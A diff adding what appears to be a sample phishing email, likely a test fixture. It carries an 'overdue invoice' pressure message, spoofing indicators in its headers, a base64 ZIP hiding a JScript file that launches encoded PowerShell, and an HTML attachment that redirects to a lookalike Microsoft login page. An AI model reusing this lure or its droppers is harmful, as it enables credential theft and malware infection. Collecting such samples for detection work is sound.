@@ -1,0 +1,52 @@
+Received: from mail-relay.fastinvoice-services.top (unknown [203.0.113.77])
+        by mx.empresa-ejemplo.es (Postfix) with ESMTP id 7C1D3E0042
+        for <contabilidad@empresa-ejemplo.es>; Tue, 29 Sep 2026 10:02:11 +0200 (CEST)
+Authentication-Results: mx.empresa-ejemplo.es;
+        spf=softfail smtp.mailfrom=billing@fastinvoice-services.top;
+        dkim=none;
+        dmarc=none header.from=accounts-dept.com
+From: Michael Turner <m.turner@accounts-dept.com>
+To: contabilidad@empresa-ejemplo.es
+Reply-To: payments.turner@proton.me
+Subject: RE: Overdue invoice #INV-20931 - final notice
+Date: Tue, 29 Sep 2026 10:01:58 +0200
+Message-ID: <e4a1b7c9d2@WIN-8QK2L1M3>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_NextPart_000_0012"
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+Hello,
+
+Please find attached the overdue invoice #INV-20931 for the services provided last month.
+Payment is due immediately. If the payment is not received within 48 hours, your account will be suspended and the case will be forwarded to our legal department.
+
+Open the attached document to review the payment details. The archive password is 2931.
+
+Kind regards,
+Michael Turner
+Accounts Receivable
+
+------=_NextPart_000_0012
+Content-Type: application/zip; name="Invoice_INV-20931.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Invoice_INV-20931.zip"
+
+UEsDBBQAAQAAAAAAAACGHs9eSwAAAEsAAAAYAAAASW52b2ljZV9JTlYtMjA5MzEucGRmLmpzdmFy
+IHM9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTtzLlJ1bigicG93ZXJzaGVsbCAt
+ZW5jIFNRQkZBRmdBIik7UEsBAhQAFAAAAAAAAAAAAIYez15LAAAASwAAABgAAAAAAAAAAAAAAAAA
+AAAAAEludm9pY2VfSU5WLTIwOTMxLnBkZi5qc1BLBQYAAAAAAQABAEYAAACBAAAAAAA=
+------=_NextPart_000_0012
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename*=utf-8''Factura%5FSeptiembre%5F2026.pdf.html
+
+PGh0bWw+PGhlYWQ+PHRpdGxlPk1pY3Jvc29mdCAzNjU8L3RpdGxlPjwvaGVhZD48Ym9keT48c2Ny
+aXB0PmRvY3VtZW50LmxvY2F0aW9uPSJodHRwczovL2xvZ2luLW1pY3Jvc29mdG9ubGluZS5jYW0v
+bzM2NS8/ZT0iK2F0b2IoIllXeDJZWEp2Iik8L3NjcmlwdD48cD5Mb2FkaW5nIGRvY3VtZW50Li4u
+PC9wPjwvYm9keT48L2h0bWw+
+------=_NextPart_000_0012--
